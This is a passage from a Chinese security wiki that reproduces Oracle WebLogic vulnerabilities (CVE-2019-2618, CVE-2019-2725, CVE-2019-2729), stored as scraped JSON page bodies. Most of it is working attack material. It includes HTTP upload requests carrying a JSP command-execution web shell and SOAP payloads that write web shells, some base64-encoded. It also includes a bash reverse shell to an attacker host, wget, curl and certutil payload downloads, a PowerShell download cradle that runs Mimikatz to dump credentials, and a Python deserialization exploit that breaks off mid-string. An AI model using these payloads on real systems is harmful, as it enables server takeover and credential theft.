text/html,application/xhtml+xml,application/xml;q=0.9,/;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Connection: close username:weblogic password:admin123456 wl_request_type:wl_jsp_refresh_request adminPath:c:\\windows\\win.ini Upgrade-Insecure-Requests: 1 Weblogic任意文件读取漏洞/media/rId26.png) Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:09:01 "},"Web安全/Weblogic/（CVE-2019-2618）Weblogic任意文件上传漏洞/（CVE-2019-2618）Weblogic任意文件上传漏洞.html":{"url":"Web安全/Weblogic/（CVE-2019-2618）Weblogic任意文件上传漏洞/（CVE-2019-2618）Weblogic任意文件上传漏洞.html","title":"（CVE-2019-2618）Weblogic任意文件上传漏洞","keywords":"","body":"cve-2019-2618 一、漏洞简介 Weblogic Upload Vuln(Need username password)-CVE-2019-2618 二、漏洞影响 Oracle WebLogic Server10.3.6.0.0 Oracle WebLogic Server12.1.3.0.0 Oracle WebLogic Server12.2.1.3.0 三、复现过程 https://github.com/ianxtianxt/cve-2019-2618 python使用 python CVE-2019-2618.py url username password Weblogic任意文件上传漏洞/media/rId26.jpg) Weblogic任意文件上传漏洞/media/rId27.jpg) 解密weblogic密码 root@f0cb7e674d7e:~/Oracle# cat /root/Oracle/Middleware/user_projects/domains/base_domain/servers/AdminServer/security/boot.properties |grep pass password={AES}dv/eNBsyg5GcDUbAKaQRheDZhzVk9yiTYVpXlGt9wEU= root@f0cb7e674d7e:~/Oracle# find / -name \"*SerializedSystemIni.dat*\" /root/Oracle/Middleware/user_projects/domains/base_domain/security/SerializedSystemIni.dat root@f0cb7e674d7e:~/Oracle# weblogic 账号密码： weblogic/Oracle@123 Weblogic任意文件上传漏洞/media/rId29.jpg) 使用docker搭建环境 参考vulnhub root@kali:~/vulhub/weblogic/CVE-2017-10271# ls 1.png docker-compose.yml README.md set_mirror.sh root@kali:~/vulhub/weblogic/CVE-2017-10271# docker-compose up -d Weblogic任意文件上传漏洞/media/rId31.jpg) POST /bea_wls_deployment_internal/DeploymentService HTTP/1.1 Host: 10.10.20.166:7001 Connection: close Accept-Encoding: gzip, deflate Accept: */* User-Agent: python-requests/2.21.0 username: weblogic wl_request_type: app_upload cache-control: no-cache wl_upload_application_name: /../tmp/_WL_internal/bea_wls_internal/9j4dqk/war serverName: Jas502n password: Oracle@123 content-type: multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxkTrZu0gW archive: true server_version: 10.3.6.0 wl_upload_delta: true Content-Length: 1081 ------WebKitFormBoundary7MA4YWxkTrZu0gW Content-Disposition: form-data; name=\"shell.jsp\"; filename=\"shell.jsp\" Content-Type: false Commands with JSP \"); Process p; if ( System.getProperty(\"os.name\").toLowerCase().indexOf(\"windows\") != -1){ p = Runtime.getRuntime().exec(\"cmd.exe /C \" + request.getParameter(\"cmd\")); } else{ p = Runtime.getRuntime().exec(request.getParameter(\"cmd\")); } OutputStream os = p.getOutputStream(); InputStream in = p.getInputStream(); DataInputStream dis = new DataInputStream(in); String disr = dis.readLine(); while ( disr != null ) { out.println(disr); disr = dis.readLine(); } } %> ------WebKitFormBoundary7MA4YWxkTrZu0gW-- 也可以换个目录上传 /root/Oracle/Middleware/user_projects/domains/base_domain/servers/AdminServer/tmp/.internal/bea_wls_deployment_internal.war /root/Oracle/Middleware/user_projects/domains/base_domain/servers/AdminServer/tmp/.internal/bea_wls_internal.war 这是上传的路径 /root/Oracle/Middleware/user_projects/domains/base_domain/servers/AdminServer/tmp/_WL_internal/bea_wls_internal /root/Oracle/Middleware/user_projects/domains/base_domain/servers/AdminServer/tmp/_WL_internal/bea_wls_deployment_internal bea_wls_internal bea_wls_deployment_internal 在同目录 这是漏洞war位置 Weblogic任意文件上传漏洞/media/rId33.jpg) POST /bea_wls_deployment_internal/DeploymentService HTTP/1.1 Host: 10.10.20.166:7001 Connection: close Accept-Encoding: gzip, deflate Accept: */* User-Agent: python-requests/2.21.0 username: weblogic wl_request_type: app_upload cache-control: no-cache wl_upload_application_name: /../tmp/_WL_internal/bea_wls_deployment_internal/gyuitk/war serverName: Jas502n password: [email protected]/* */ content-type: multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxkTrZu0gW archive: true server_version: 10.3.6.0 wl_upload_delta: true Content-Length: 1084 ------WebKitFormBoundary7MA4YWxkTrZu0gW Content-Disposition: form-data; name=\"shell.jsp\"; filename=\"shell111.jsp\" Content-Type: false Commands with JSP \"); Process p; if ( System.getProperty(\"os.name\").toLowerCase().indexOf(\"windows\") != -1){ p = Runtime.getRuntime().exec(\"cmd.exe /C \" + request.getParameter(\"cmd\")); } else{ p = Runtime.getRuntime().exec(request.getParameter(\"cmd\")); } OutputStream os = p.getOutputStream(); InputStream in = p.getInputStream(); DataInputStream dis = new DataInputStream(in); String disr = dis.readLine(); while ( disr != null ) { out.println(disr); disr = dis.readLine(); } } %> ------WebKitFormBoundary7MA4YWxkTrZu0gW- Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:09:02 "},"Web安全/Weblogic/（CVE-2019-2725）（CNVD-C-2019-48814）Weblogic反序列化远程代码执行漏洞/（CVE-2019-2725）（CNVD-C-2019-48814）Weblogic反序列化远程代码执行漏洞.html":{"url":"Web安全/Weblogic/（CVE-2019-2725）（CNVD-C-2019-48814）Weblogic反序列化远程代码执行漏洞/（CVE-2019-2725）（CNVD-C-2019-48814）Weblogic反序列化远程代码执行漏洞.html","title":"（CVE-2019-2725）（CNVD-C-2019-48814）Weblogic反序列化远程代码执行漏洞","keywords":"","body":"（CVE-2019-2725）（CNVD-C-2019-48814） 一、漏洞简介 二、漏洞影响 Oracle WebLogic Server 10.x Oracle WebLogic Server 12.1.3 三、复现过程 访问http://www.0-sec.org/_async/AsyncResponseService (CNVD-C-2019-48814)Weblogic反序列化远程代码执行漏洞/media/rId25.shtml) 若出现以上情况，则有可能会存在漏洞。 Win/Linux 通用写入shell代码（一） POST /_async/AsyncResponseService HTTP/1.1 Host: ip:port Content-Length: 1142 Accept-Encoding: gzip, deflate SOAPAction: Accept: */* User-Agent: Apache-HttpClient/4.1.1 (java 1.5) Connection: keep-alive content-type: text/xml xxxxservers/AdminServer/tmp/_WL_internal/bea_wls9_async_response/8tpkys/war/webshell.jsp\"); while((a=in.read(b))!=-1){ out.println(new String(b)); } out.print(\"\"); } %>]]> 执行完之后访问 http://www.0-sec.org/_async/webshell.jsp?pwd=123&cmd=whoami Win/Linux 通用写入shell代码（二） POST /_async/AsyncResponseService HTTP/1.1 Host: ip:port Content-Length: 1136 Accept-Encoding: gzip, deflate SOAPAction: Accept: */* User-Agent: Apache-HttpClient/4.1.1 (java 1.5) Connection: keep-alive content-type: text/xml xxxxservers/AdminServer/tmp/_WL_internal/bea_wls_internal/9j4dqk/war/webshell.jsp\"); while((a=in.read(b))!=-1){ out.println(new String(b)); } out.print(\"\"); } %>]]> 执行完之后访问 http://www.0-sec.org/bea_wls_internal/webshell.jsp?pwd=123&cmd=whoami (注：上述报文中servers/AdminServer/tmp/_WL_internal/bea_wls9_async_response/8tpkys/war/，servers/AdminServer/tmp/_WL_internal/bea_wls_internal/9j4dqk/war/ 均为默认路径，如果路径修改，可以配合反弹shell进行获取) Linux 反弹shell POST /_async/AsyncResponseService HTTP/1.1 Host: ip:port Content-Length: 853 Accept-Encoding: gzip, deflate SOAPAction: Accept: */* User-Agent: Apache-HttpClient/4.1.1 (java 1.5) Connection: keep-alive content-type: text/xml xx xx /bin/bash -c bash -i >& /dev/tcp/vpsip/vpsport 0>&1 写入webshell（需要公网） //这里提供两个代码 需要自己在公网上放置一个webshell.txt webshell地址：http://www.0-sec.org/_async/webshell.jsp POST /_async/AsyncResponseService HTTP/1.1 Host: ip:port Content-Length: 789 Accept-Encoding: gzip, deflate SOAPAction: Accept: */* User-Agent: Apache-HttpClient/4.1.1 (java 1.5) Connection: keep-alive content-type: text/xml xx xx /bin/bash -c wget http://vpsip:vpsport/webshell.txt -O servers/AdminServer/tmp/_WL_internal/bea_wls9_async_response/8tpkys/war/webshell.jsp POST /_async/AsyncResponseService HTTP/1.1 Host: ip:port Content-Length: 789 Accept-Encoding: gzip, deflate SOAPAction: Accept: */* User-Agent: Apache-HttpClient/4.1.1 (java 1.5) Connection: keep-alive content-type: text/xml xx xx /bin/bash -c curl http://vpsip:vpsport/webshell.txt -o servers/AdminServer/tmp/_WL_internal/bea_wls9_async_response/8tpkys/war/webshell.jsp 写入webshell（无需公网） //这里提供两个代码 POST /_async/AsyncResponseService HTTP/1.1 Host: 192.168.50.219:7001 Content-Length: 1378 Accept-Encoding: gzip, deflate SOAPAction: Accept: */* User-Agent: Apache-HttpClient/4.1.1 (java 1.5) Connection: keep-alive content-type: text/xml xx xx /bin/bash -c echo PCUKICAgIGlmKCIxMjMiLmVxdWFscyhyZXF1ZXN0LmdldFBhcmFtZXRlcigicHdkIikpKXsKICAgICAgICBqYXZhLmlvLklucHV0U3RyZWFtIGluID0gUnVudGltZS5nZXRSdW50aW1lKCkuZXhlYyhyZXF1ZXN0LmdldFBhcmFtZXRlcigiY21kIikpLmdldElucHV0U3RyZWFtKCk7CiAgICAgICAgaW50IGEgPSAtMTsgICAgICAgICAgCiAgICAgICAgYnl0ZVtdIGIgPSBuZXcgYnl0ZVsxMDI0XTsgICAgICAgICAgCiAgICAgICAgb3V0LnByaW50KCI8cHJlPiIpOyAgICAgICAgICAKICAgICAgICB3aGlsZSgoYT1pbi5yZWFkKGIpKSE9LTEpewogICAgICAgICAgICBvdXQucHJpbnRsbihuZXcgU3RyaW5nKGIpKTsgICAgICAgICAgCiAgICAgICAgfQogICAgICAgIG91dC5wcmludCgiPC9wcmU+Iik7CiAgICB9IAogICAgJT4= |base64 -d > servers/AdminServer/tmp/_WL_internal/bea_wls9_async_response/8tpkys/war/webshell.jsp 写入的webshell地址为：http://www/0-sec.org/_async/webshell.jsp?pwd=123&cmd=whoami POST /_async/AsyncResponseService HTTP/1.1 Host: 192.168.50.219:7001 Content-Length: 1376 Accept-Encoding: gzip, deflate SOAPAction: Accept: */* User-Agent: Apache-HttpClient/4.1.1 (java 1.5) Connection: keep-alive content-type: text/xml xx xx /bin/bash -c echo PCUKICAgIGlmKCIxMjMiLmVxdWFscyhyZXF1ZXN0LmdldFBhcmFtZXRlcigicHdkIikpKXsKICAgICAgICBqYXZhLmlvLklucHV0U3RyZWFtIGluID0gUnVudGltZS5nZXRSdW50aW1lKCkuZXhlYyhyZXF1ZXN0LmdldFBhcmFtZXRlcigiY21kIikpLmdldElucHV0U3RyZWFtKCk7CiAgICAgICAgaW50IGEgPSAtMTsgICAgICAgICAgCiAgICAgICAgYnl0ZVtdIGIgPSBuZXcgYnl0ZVsxMDI0XTsgICAgICAgICAgCiAgICAgICAgb3V0LnByaW50KCI8cHJlPiIpOyAgICAgICAgICAKICAgICAgICB3aGlsZSgoYT1pbi5yZWFkKGIpKSE9LTEpewogICAgICAgICAgICBvdXQucHJpbnRsbihuZXcgU3RyaW5nKGIpKTsgICAgICAgICAgCiAgICAgICAgfQogICAgICAgIG91dC5wcmludCgiPC9wcmU+Iik7CiAgICB9IAogICAgJT4= |base64 -d > servers/AdminServer/tmp/_WL_internal/bea_wls_internal/9j4dqk/war/webshell.jsp 写入的webshell地址为：http://www.0-sec.org/bea_wls_internal/webshell.jsp?pwd=123&cmd=whoami Win 反弹shell 可直接使用CobaltStrike生成一个payload.ps1 powershell脚本，将该脚本放到公网上，然后使用如下报文即可 POST /_async/AsyncResponseService HTTP/1.1 Host: ip:port Content-Length: 861 Accept-Encoding: gzip, deflate SOAPAction: Accept: */* User-Agent: Apache-HttpClient/4.1.1 (java 1.5) Connection: keep-alive content-type: text/xml xx xx cmd /c powershell \"IEX (New-Object Net.WebClient).DownloadString('http://ip:port/payload.ps1'); Invoke-Mimikatz -DumpCreds\" 写入webshell（需要公网） //这里提供两个代码 需要自己在公网上放置一个webshell.txt webshell地址为：http://www.0-sec.org/_async/webshell.jsp POST /_async/AsyncResponseService HTTP/1.1 Host: ip:port Content-Length: 854 Accept-Encoding: gzip, deflate SOAPAction: Accept: */* User-Agent: Apache-HttpClient/4.1.1 (java 1.5) Connection: keep-alive content-type: text/xml xx xx cmd /c powershell (new-object System.Net.WebClient).DownloadFile( 'http://ip:port/webshell.txt','servers/AdminServer/tmp/_WL_internal/bea_wls9_async_response/8tpkys/war/webshell.jsp') POST /_async/AsyncResponseService HTTP/1.1 Host: ip:port Content-Length: 854 Accept-Encoding: gzip, deflate SOAPAction: Accept: */* User-Agent: Apache-HttpClient/4.1.1 (java 1.5) Connection: keep-alive content-type: text/xml xx xx cmd /c certutil -urlcache -split -f http://ip:port/webshell.txt servers/AdminServer/tmp/_WL_internal/bea_wls9_async_response/8tpkys/war/webshell.jsp 写入webshell （无需公网） //这里提供四个代码 前两组代码 POST /_async/AsyncResponseService HTTP/1.1 Host: ip:port Content-Length: 1367 Accept-Encoding: gzip, deflate SOAPAction: Accept: */* User-Agent: Apache-HttpClient/4.1.1 (java 1.5) Connection: keep-alive content-type: text/xml xx xx cmd /c echo PCUKICAgIGlmKCIxMjMiLmVxdWFscyhyZXF1ZXN0LmdldFBhcmFtZXRlcigicHdkIikpKXsKICAgICAgICBqYXZhLmlvLklucHV0U3RyZWFtIGluID0gUnVudGltZS5nZXRSdW50aW1lKCkuZXhlYyhyZXF1ZXN0LmdldFBhcmFtZXRlcigiY21kIikpLmdldElucHV0U3RyZWFtKCk7CiAgICAgICAgaW50IGEgPSAtMTsgICAgICAgICAgCiAgICAgICAgYnl0ZVtdIGIgPSBuZXcgYnl0ZVsxMDI0XTsgICAgICAgICAgCiAgICAgICAgb3V0LnByaW50KCI8cHJlPiIpOyAgICAgICAgICAKICAgICAgICB3aGlsZSgoYT1pbi5yZWFkKGIpKSE9LTEpewogICAgICAgICAgICBvdXQucHJpbnRsbihuZXcgU3RyaW5nKGIpKTsgICAgICAgICAgCiAgICAgICAgfQogICAgICAgIG91dC5wcmludCgiPC9wcmU+Iik7CiAgICB9IAogICAgJT4= > servers\\AdminServer\\tmp\\_WL_internal\\bea_wls9_async_response\\8tpkys\\war\\webshell.txt POST /_async/AsyncResponseService HTTP/1.1 Host: ip:port Content-Length: 913 Accept-Encoding: gzip, deflate SOAPAction: Accept: */* User-Agent: Apache-HttpClient/4.1.1 (java 1.5) Connection: keep-alive content-type: text/xml xx xx cmd /c certutil -decode servers\\AdminServer\\tmp\\_WL_internal\\bea_wls9_async_response\\8tpkys\\war\\webshell.txt servers\\AdminServer\\tmp\\_WL_internal\\bea_wls9_async_response\\8tpkys\\war\\webshell.jsp 这两组代码的webshell地址为：http://www.0-sec.org/_async/webshell.jsp?pwd=123&cmd=whoami 后两组代码 POST /_async/AsyncResponseService HTTP/1.1 Host: ip:port Content-Length: 1367 Accept-Encoding: gzip, deflate SOAPAction: Accept: */* User-Agent: Apache-HttpClient/4.1.1 (java 1.5) Connection: keep-alive content-type: text/xml xx xx cmd /c echo PCUKICAgIGlmKCIxMjMiLmVxdWFscyhyZXF1ZXN0LmdldFBhcmFtZXRlcigicHdkIikpKXsKICAgICAgICBqYXZhLmlvLklucHV0U3RyZWFtIGluID0gUnVudGltZS5nZXRSdW50aW1lKCkuZXhlYyhyZXF1ZXN0LmdldFBhcmFtZXRlcigiY21kIikpLmdldElucHV0U3RyZWFtKCk7CiAgICAgICAgaW50IGEgPSAtMTsgICAgICAgICAgCiAgICAgICAgYnl0ZVtdIGIgPSBuZXcgYnl0ZVsxMDI0XTsgICAgICAgICAgCiAgICAgICAgb3V0LnByaW50KCI8cHJlPiIpOyAgICAgICAgICAKICAgICAgICB3aGlsZSgoYT1pbi5yZWFkKGIpKSE9LTEpewogICAgICAgICAgICBvdXQucHJpbnRsbihuZXcgU3RyaW5nKGIpKTsgICAgICAgICAgCiAgICAgICAgfQogICAgICAgIG91dC5wcmludCgiPC9wcmU+Iik7CiAgICB9IAogICAgJT4= > servers/AdminServer/tmp/_WL_internal/bea_wls_internal/9j4dqk/war/webshell.txt POST /_async/AsyncResponseService HTTP/1.1 Host: ip:port Content-Length: 913 Accept-Encoding: gzip, deflate SOAPAction: Accept: */* User-Agent: Apache-HttpClient/4.1.1 (java 1.5) Connection: keep-alive content-type: text/xml xx xx cmd /c certutil -decode servers/AdminServer/tmp/_WL_internal/bea_wls_internal/9j4dqk/war/webshell.txt servers/AdminServer/tmp/_WL_internal/bea_wls_internal/9j4dqk/war/webshell.jsp 这两组代码的webshell地址为：http://www.0-sec.org/bea_wls_internal/webshell.jsp?pwd=123&cmd=whoami 自动化脚本 https://github.com/ianxtianxt/CVE-2019-2725 cve2019-2725_weblogic_rce.bat http://192.168.31.5:7001 \"cat /etc/passwd\" 参考链接 https://mp.weixin.qq.com/s?__biz=MzA3NjU5MTIxMg==&mid=2650560530&idx=1&sn=86f5e0811c003c71965a4fc088f18100&chksm=87560111b02188071b9a60a36316b931770b0ed58b02b63d2d2428a5120d6809030d94031589&scene=21#wechat_redirect Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:09:04 "},"Web安全/Weblogic/（CVE-2019-2729）Weblogic反序列化漏洞/（CVE-2019-2729）Weblogic反序列化漏洞.html":{"url":"Web安全/Weblogic/（CVE-2019-2729）Weblogic反序列化漏洞/（CVE-2019-2729）Weblogic反序列化漏洞.html","title":"（CVE-2019-2729）Weblogic反序列化漏洞","keywords":"","body":"（CVE-2019-2729）Weblogic反序列化漏洞 一、漏洞简介 与CVE-2019-2725漏洞相似，**CVE-2019-2729漏洞是由于应用在处理反序列化输入信息时存在缺陷，攻击者可以通过发送精心构造的恶意 HTTP 请求，用于获得目标服务器的权限，并在未授权的情况下执行远程命令，最终获取服务器的权限。**针对此漏洞，官方已经发布补丁，所以强烈建议受到影响的用户尽快下载官方最新补丁，以防服务器处于高风险之中。 二、漏洞影响 Oracle WebLogic 10.3.6 Oracle WebLogic 12.1.3 Oracle WebLogic 12.2.1.3 三、复现过程 poc usage: oracle-weblogic-deserialize.py [-h] -u TARGET -c COMMAND -h, --help : Show help message and exit> -u TARGET : Target URL> -c COMMAND : Command to execute Example Usage python oracle-weblogic-deserialize.py -u http://www.0-sec.org:8080 -c whoami import argparse import requests import sys import os import base64 import urllib3 parser = argparse.ArgumentParser() parser.add_argument('-u', dest='target', default='', required=True, help=\"Target URL\") parser.add_argument('-c', dest='command', default='', required=True, help=\"Command\") args = parser.parse_args() target = str(args.target) command = str(args.command) headers = { 'Content-Type':'text/xml', 'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:60.0) Gecko/20100101 Firefox/60.0', 'SOAPAction':'', 'lfcmd':command } url = target + \"/wls-wsat/CoordinatorPortType\" pref = ' oracle.toplink.internal.sessions.UnitOfWorkChangeSet ' yss_obj = \"CjxhcnJheSBjbGFzcz0iYnl0ZSIgbGVuZ3RoPSI2ODYyIj48dm9pZCBpbmRleD0iMTYwMSI+PGJ5dGU+MTAwPC9ieXRlPjwvdm9pZD48dm9pZCBpbmRleD0iMTM4MSI+PGJ5dGU+NjQ8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSIyODkzIj48Ynl0ZT42NTwvYnl0ZT48L3ZvaWQ+PHZvaWQgaW5kZXg9IjEyMzUiPjxieXRlPjk5PC9ieXRlPjwvdm9pZD48dm9pZCBpbmRleD0iMTE1Ij48Ynl0ZT4xMDg8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSIxMDkyIj48Ynl0ZT4xMTU8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSIyNjE5Ij48Ynl0ZT42NjwvYnl0ZT48L3ZvaWQ+PHZvaWQgaW5kZXg9IjIwOTEiPjxieXRlPjcyPC9ieXRlPjwvdm9pZD48dm9pZCBpbmRleD0iNjM1NCI+PGJ5dGU+MTA8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSIyMTY0Ij48Ynl0ZT4xMTU8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSIxNTc4Ij48Ynl0ZT4xMDQ8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSI4OTciPjxieXRlPjEwMTwvYnl0ZT48L3ZvaWQ+PHZvaWQgaW5kZXg9IjE2MjUiPjxieXRlPjEyPC9ieXRlPjwvdm9pZD48dm9pZCBpbmRleD0iNjY0MSI+PGJ5dGU+NzI8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSI2MjYyIj48Ynl0ZT40NzwvYnl0ZT48L3ZvaWQ+PHZvaWQgaW5kZXg9IjM3MCI+PGJ5dGU+MTA1PC9ieXRlPjwvdm9pZD48dm9pZCBpbmRleD0iMjIxNiI+PGJ5dGU+NzQ8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSI1MTQ3Ij48Ynl0ZT4xMTY8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSIxMjU1Ij48Ynl0ZT4xMDk8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSIyMDQiPjxieXRlPjEwMTwvYnl0ZT48L3ZvaWQ+PHZvaWQgaW5kZXg9IjE0ODQiPjxieXRlPjk3PC9ieXRlPjwvdm9pZD48dm9pZCBpbmRleD0iNDEwOCI+PGJ5dGU+NjU8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSIxNjQyIj48Ynl0ZT4xMTE8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSI0MzE4Ij48Ynl0ZT4xMDU8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSI2NjUyIj48Ynl0ZT4yMTwvYnl0ZT48L3ZvaWQ+PHZvaWQgaW5kZXg9IjYzMjQiPjxieXRlPjI8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSI0OTY1Ij48Ynl0ZT4xMDE8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSI2MTcxIj48Ynl0ZT40OTwvYnl0ZT48L3ZvaWQ+PHZvaWQgaW5kZXg9IjM2NTIiPjxieXRlPjY1PC9ieXRlPjwvdm9pZD48dm9pZCBpbmRleD0iMTc4MyI+PGJ5dGU+MTA5PC9ieXRlPjwvdm9pZD48dm9pZCBpbmRleD0iMjc2NiI+PGJ5dGU+MTAwPC9ieXRlPjwvdm9pZD48dm9pZCBpbmRleD0iNTU5NCI+PGJ5dGU+MjwvYnl0ZT48L3ZvaWQ+PHZvaWQgaW5kZXg9Ijk0MiI+PGJ5dGU+MTA4PC9ieXRlPjwvdm9pZD48dm9pZCBpbmRleD0iNDc4NiI+PGJ5dGU+NzY8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSIyMzU5Ij48Ynl0ZT4xMTk8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSI1MzQxIj48Ynl0ZT4xMDU8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSI1MjkiPjxieXRlPjExMTwvYnl0ZT48L3ZvaWQ+PHZvaWQgaW5kZXg9IjE3NTkiPjxieXRlPjExODwvYnl0ZT48L3ZvaWQ+PHZvaWQgaW5kZXg9IjMxNDgiPjxieXRlPjEwNDwvYnl0ZT48L3ZvaWQ+PHZvaWQgaW5kZXg9IjUyNjkiPjxieXRlPjExMTwvYnl0ZT48L3ZvaWQ+PHZvaWQgaW5kZXg9IjU0MzIiPjxieXRlPjExNTwvYnl0ZT48L3ZvaWQ+PHZvaWQgaW5kZXg9IjIxMzkiPjxieXRlPjEwNTwvYnl0ZT48L3ZvaWQ+PHZvaWQgaW5kZXg9IjM2Ij48Ynl0ZT4tMzU8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSIzNTQ4Ij48Ynl0ZT44MjwvYnl0ZT48L3ZvaWQ+PHZvaWQgaW5kZXg9IjQ3ODgiPjxieXRlPjk3PC9ieXRlPjwvdm9pZD48dm9pZCBpbmRleD0iMTU0MSI+PGJ5dGU+NTA8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSI1ODgxIj48Ynl0ZT40PC9ieXRlPjwvdm9pZD48dm9pZCBpbmRleD0iNTk0NyI+PGJ5dGU+LTc0PC9ieXRlPjwvdm9pZD48dm9pZCBpbmRleD0iNTIzNSI+PGJ5dGU+OTc8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSIyMTQ0Ij48Ynl0ZT43MDwvYnl0ZT48L3ZvaWQ+PHZvaWQgaW5kZXg9IjMzNjEiPjxieXRlPjEwNDwvYnl0ZT48L3ZvaWQ+PHZvaWQgaW5kZXg9IjI5NDciPjxieXRlPjg3PC9ieXRlPjwvdm9pZD48dm9pZCBpbmRleD0iMjQwOCI+PGJ5dGU+MTA4PC9ieXRlPjwvdm9pZD48dm9pZCBpbmRleD0iNjE4MyI+PGJ5dGU+MTAxPC9ieXRlPjwvdm9pZD48dm9pZCBpbmRleD0iMTMyMCI+PGJ5dGU+NTA8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSIxODEzIj48Ynl0ZT4xMDM8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSIyODA4Ij48Ynl0ZT4xMTI8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSIyMDMiPjxieXRlPjgzPC9ieXRlPjwvdm9pZD48dm9pZCBpbmRleD0iNDI4NiI+PGJ5dGU+MTE1PC9ieXRlPjwvdm9pZD48dm9pZCBpbmRleD0iMTY4OSI+PGJ5dGU+NDE8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSIzNTgwIj48Ynl0ZT42OTwvYnl0ZT48L3ZvaWQ+PHZvaWQgaW5kZXg9IjMxMjEiPjxieXRlPjQ4PC9ieXRlPjwvdm9pZD48dm9pZCBpbmRleD0iMzEwMCI+PGJ5dGU+NjU8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSI0MTQyIj48Ynl0ZT42NTwvYnl0ZT48L3ZvaWQ+PHZvaWQgaW5kZXg9IjUzNyI+PGJ5dGU+OTc8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSIxNDE3Ij48Ynl0ZT4xMTU8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSI0NDk4Ij48Ynl0ZT41OTwvYnl0ZT48L3ZvaWQ+PHZvaWQgaW5kZXg9IjE5MzciPjxieXRlPjY1PC9ieXRlPjwvdm9pZD48dm9pZCBpbmRleD0iMjk4NSI+PGJ5dGU+MTA0PC9ieXRlPjwvdm9pZD48dm9pZCBpbmRleD0iMTUwMCI+PGJ5dGU+MTAxPC9ieXRlPjwvdm9pZD48dm9pZCBpbmRleD0iNTQ0NyI+PGJ5dGU+NTY8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSIzMzA0Ij48Ynl0ZT43MDwvYnl0ZT48L3ZvaWQ+PHZvaWQgaW5kZXg9IjUwOTciPjxieXRlPjczPC9ieXRlPjwvdm9pZD48dm9pZCBpbmRleD0iNzcwIj48Ynl0ZT4xMTA8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSIyMjQ0Ij48Ynl0ZT41NzwvYnl0ZT48L3ZvaWQ+PHZvaWQgaW5kZXg9IjQ3MTYiPjxieXRlPjEwPC9ieXRlPjwvdm9pZD48dm9pZCBpbmRleD0iMzQ1MCI+PGJ5dGU+NjU8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSIyMTUiPjxieXRlPjk3PC9ieXRlPjwvdm9pZD48dm9pZCBpbmRleD0iNjYzMSI+PGJ5dGU+NzM8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSI0NDMwIj48Ynl0ZT4xMTE8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSIzNzI1Ij48Ynl0ZT44NDwvYnl0ZT48L3ZvaWQ+PHZvaWQgaW5kZXg9IjE4ODkiPjxieXRlPjY1PC9ieXRlPjwvdm9pZD48dm9pZCBpbmRleD0iMjMzMSI+PGJ5dGU+NTA8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSIzMDExIj48Ynl0ZT4xMDk8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSIzNzg3Ij48Ynl0ZT4xMTQ8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSI2ODM4Ij48Ynl0ZT40NjwvYnl0ZT48L3ZvaWQ+PHZvaWQgaW5kZXg9IjY2OTQiPjxieXRlPjQ8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSI2MjYwIj48Ynl0ZT4xMTg8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSI1ODExIj48Ynl0ZT41NzwvYnl0ZT48L3ZvaWQ+PHZvaWQgaW5kZXg9IjM0MzMiPjxieXRlPjExMjwvYnl0ZT48L3ZvaWQ+PHZvaWQgaW5kZXg9IjI1MDYiPjxieXRlPjEwMDwvYnl0ZT48L3ZvaWQ+PHZvaWQgaW5kZXg9IjI0MiI+PGJ5dGU+MTE1PC9ieXRlPjwvdm9pZD48dm9pZCBpbmRleD0iNDA2MCI+PGJ5dGU+ODU8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSIzNTc5Ij48Ynl0ZT42NTwvYnl0ZT48L3ZvaWQ+PHZvaWQgaW5kZXg9IjMzMzYiPjxieXRlPjUzPC9ieXRlPjwvdm9pZD48dm9pZCBpbmRleD0iNTgwNiI+PGJ5dGU+NTM8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSI2NjM2Ij48Ynl0ZT45NzwvYnl0ZT48L3ZvaWQ+PHZvaWQgaW5kZXg9IjQzMzEiPjxieXRlPjY4PC9ieXRlPjwvdm9pZD48dm9pZCBpbmRleD0iNTE3OSI+PGJ5dGU+MTI8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSI2MDE0Ij48Ynl0ZT4yMTwvYnl0ZT48L3ZvaWQ+PHZvaWQg